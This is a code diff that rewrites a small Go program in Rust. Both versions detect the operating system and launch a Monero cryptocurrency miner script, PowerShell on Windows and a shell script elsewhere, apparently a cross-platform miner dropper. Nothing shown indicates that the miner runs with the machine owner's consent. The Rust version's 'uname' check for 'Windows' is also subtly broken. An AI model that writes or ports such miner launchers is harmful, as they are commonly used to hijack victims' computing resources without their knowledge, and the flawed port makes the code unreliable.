@@ -1,40 +1,28 @@
-package main
+use std::process::Command;
 
-import (
-    "fmt"
-    "os/exec"
-    "runtime"
-)
+fn main() {
+    let output = Command::new("uname")
+        .arg("-s")
+        .output()
+        .expect("Failed to execute command");
 
-func main() {
-    // Get current operating system
-    os := runtime.GOOS
+    let os = String::from_utf8_lossy(&output.stdout);
+    let os = os.trim();
 
-    var cmd *exec.Cmd
-    var err error
-    var output []byte
-
-    // Choose appropriate miner script
-    switch os {
-    case "windows":
-        cmd = exec.Command("powershell.exe", "-File", "monero-miner.ps1")
-    case "linux":
-        cmd = exec.Command("bash", "monero-miner.sh")
-    case "darwin":
-        cmd = exec.Command("bash", "monero-miner.sh")
-    default:
-        fmt.Println("Unsupported operating system.")
-        return
+    if os == "Windows" {
+        // Run monero-miner.ps1 on Windows
+        Command::new("powershell")
+            .arg("-File")
+            .arg("monero-miner.ps1")
+            .spawn()
+            .expect("Failed to execute powershell script");
+    } else {
+        // Run miner.sh on Linux/macOS
+        Command::new("sh")
+            .arg("monero-miner.sh")
+            .spawn()
+            .expect("Failed to execute shell script");
     }
-
-    // Run miner script
-    output, err = cmd.CombinedOutput()
-    if err != nil {
-        fmt.Println(err)
-        fmt.Println(string(output))
-        return
-    }
-    fmt.Println(string(output))
 }
 
        
